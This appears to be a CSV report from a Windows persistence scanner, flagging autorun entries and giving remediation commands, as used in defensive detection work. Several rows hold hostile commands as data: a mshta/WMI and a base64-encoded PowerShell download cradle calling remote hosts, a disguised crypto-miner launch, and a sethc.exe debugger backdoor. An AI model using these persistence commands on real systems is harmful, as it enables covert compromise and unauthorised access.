entry_id,name,category,severity,total_score,location,raw_command,resolved_path,enabled,user_context,is_signed,signature_status,signer_name,sha256,md5,entropy,is_high_entropy,remediation_command,findings_summary
d701c326,WinAudioHelper,Registry Run,CRITICAL,100,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,"""C:\Users\Public\svchost.exe"" --background --stratum=pool.minexmr.com:4444",C:\Users\Public\svchost.exe,True,HKCU,False,NotSigned,,8f4e2b01c34a9b58210f92b7405df6248d21b926487e42d743a196e481283c9a,e4d909c290d0fb1ca068ffaddf22cbd0,7.86,True,"Remove-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" -Name ""WinAudioHelper""",Critical System Process Masquerading (CRITICAL); Suspicious Writable Execution Directory (HIGH); Unsigned Startup Executable (LOW); High Shannon Entropy (7.86) / Packed Binary (HIGH); Known Packer / Crypter Section Detected (HIGH); Suspicious Injection / Memory APIs (MEDIUM); Corporate Metadata Impersonation (HIGH)
1962f578,WMI Subscription: SystemHealthSync,WMI Event Consumer,CRITICAL,100,root\subscription\CommandLineEventConsumer (SystemHealthSync),"mshta.exe javascript:a=new(ActiveXObject)('WScript.Shell');a.Run('powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://evil.internal/sync.hta\')',0);window.close()",C:\Windows\System32\mshta.exe,True,NT AUTHORITY\SYSTEM (WMI Provider),True,Valid,Microsoft Windows,7b70b26081cfa5fae721f6e0a63960034d25cc94d157cd649a4e9907b5af37ea,36d15dde6d71802d9588cc0d48edf8ea,2.4653,False,"Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter ""Name='SystemHealthSync'"" | Remove-CimInstance",Obfuscated Command: Remote Web Download Cradle (CRITICAL); Living-Off-The-Land Binary (mshta.exe) (MEDIUM); WMI Event Subscription Persistence (HIGH)
e744a548,Startup File: Q3_Financial_Audit_Report.pdf.exe,Startup Folder (LNK/Binary),CRITICAL,100,User Startup Folder (C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe),C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe,C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe,True,HKCU,False,NotSigned,,4cf8291a84f38d6f72576315804537b04f56f1008263da10240f471edd2f8605,5d41402abc4b2a76b9719d911017c592,7.68,True,"Remove-Item -Path ""C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe"" -Force",Deceptive Double File Extension (CRITICAL); Unsigned Startup Executable (LOW); High Shannon Entropy (7.68) / Packed Binary (HIGH); Timestomping Timestamp Anomaly (MEDIUM)
c98f122a,Task: WindowsDefenderTelemetryUpdate,Scheduled Task,CRITICAL,95,Tasks\Microsoft\Windows\Maintenance\TelemetryUpdate,powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwB5AHMAdABlAG0ALQB1AHAAZABhAHQAZQBzAC4AdABvAHAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,True,NT AUTHORITY\SYSTEM (At System Startup),True,Valid,Microsoft Windows,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e,5.3938,False,"Unregister-ScheduledTask -TaskName ""\Microsoft\Windows\Maintenance\TelemetryUpdate"" -Confirm:$false",Obfuscated Command: Base64 Encoded PowerShell Command (-enc) (CRITICAL); Living-Off-The-Land Binary (powershell.exe) (MEDIUM); Timestomping Timestamp Anomaly (MEDIUM)
7d45aafc,IFEO Hijack: sethc.exe,Image File Execution Options (IFEO),CRITICAL,95,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,True,HKLM (System-wide),True,Valid,Microsoft Windows,a6e3b3b22b7fe8ce2c9245816126723eaa13f43b9f591883e59959a2d409426a,7620f0bc3228fe019a6bd8c593c1d856,5.9486,False,"Remove-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" -Name ""Debugger""",Image File Execution Options (IFEO) Hijack (CRITICAL); Timestomping Timestamp Anomaly (MEDIUM); Suspicious Injection / Memory APIs (MEDIUM)
92da039e,Service: Custom Cloud Enterprise Agent,Windows Service,MEDIUM,20,HKLM\SYSTEM\CurrentControlSet\Services\CloudAgent,C:\Program Files\Enterprise Cloud Agent\service\agent_service.exe --start,C:\Program Files\Enterprise Cloud Agent\service\agent_service.exe,True,LocalSystem (Auto Start),False,NotSigned,,,,6.12,False,"Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\CloudAgent"" -Name ""ImagePath"" -Value '""C:\Program Files\Enterprise Cloud Agent\service\agent_service.exe"" --start'",Unquoted Service Path Vulnerability (MEDIUM)
6478d2ba,GoogleChromeAutoLaunch,Registry Run,CLEAN,0,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --no-startup-window /prefetch:5",C:\Program Files\Google\Chrome\Application\chrome.exe,True,HKCU,True,Valid,"CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US",,,6.45,False,"Remove-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" -Name ""GoogleChromeAutoLaunch""",
61ebba8a,OneDrive,Registry Run,CLEAN,0,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,"""C:\Users\TargetUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /background",C:\Users\TargetUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe,True,HKCU,True,Valid,"CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",,,6.32,False,"Remove-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" -Name ""OneDrive""",
114ec371,Winlogon Shell,Winlogon Persistence,CLEAN,0,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,explorer.exe,C:\Windows\explorer.exe,True,HKLM,True,Valid,Microsoft Windows,,,6.28,False,,
